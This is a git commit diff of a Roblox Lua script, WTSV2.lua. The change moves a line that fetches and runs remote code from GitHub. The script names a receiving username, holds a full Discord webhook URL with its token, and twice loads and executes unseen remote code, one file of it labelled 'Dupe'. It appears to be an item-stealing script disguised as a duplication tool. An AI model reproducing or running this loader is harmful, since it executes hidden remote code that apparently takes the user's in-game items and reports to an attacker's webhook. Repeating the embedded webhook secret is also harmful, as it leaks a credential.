cc5667d1fd440fc9814230bbce288227ee620504
JoystickpIays <bryllecorro03@gmail.com>
2024-09-06 17:01:22 +0800

    Update WTSV2.lua

--- WTSV2.lua
+++ WTSV2.lua
@@ -1,6 +1,5 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"))() 
-
-getgenv().gui = false
 Username = "User_boblex"
 Webhook = "https://discord.com/api/webhooks/1277429981659791410/VccbDVfCXx9sT9IChUPsWwzRp_jioH0AxxPvsJxwqzE3q7QEksEwiorZMe_n3SWvKAZA"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/main.lua", true))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"))() 
